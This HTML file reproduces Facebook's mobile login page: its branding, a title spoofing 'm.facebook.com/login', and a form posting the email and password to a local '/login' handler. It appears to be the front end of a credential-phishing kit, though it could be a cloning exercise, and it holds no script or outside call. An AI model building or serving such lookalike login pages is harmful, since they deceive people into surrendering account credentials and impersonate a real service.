<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/style.css">
    <title>m.facebook.com/login</title>
</head>

<body>
<div class="container">
    <header>
        <h2>facebook</h2>
    </header>
    <div class="form-container">
        <form action="/login" method="POST">
            <input type="text" name="email" placeholder="Mobile number or email address">
            <input type="password" name="pwd" placeholder="Password">
            <button type="submit" name="submit">Log In</button>
            <a class="forgot-password" href="#">Forgotten password?</a>
        </form>

        <div class="center-line">
            <span></span>
            <p>or</p>
            <span></span>
        </div>

        <button class="creat-account-btn">Create New Account</button>
    </div>

    <footer>
        <ul class="footer-list">
            <li><a href="#">English(UK)</a></li>
            <li><a href="#">Filipino</a></li>
            <li><a href="#"></a></li>
            <li><a href="#">Espanol</a></li>
            <li><a href="#">Bisaya</a></li>
            <li><a class="cross" href="#">+</a></li>
            <li><a href="#">Portugues(Brazil)</a></li>

        </ul>
        <p>Facebook Inc.</p>
    </footer>
</div>
</body>

</html>
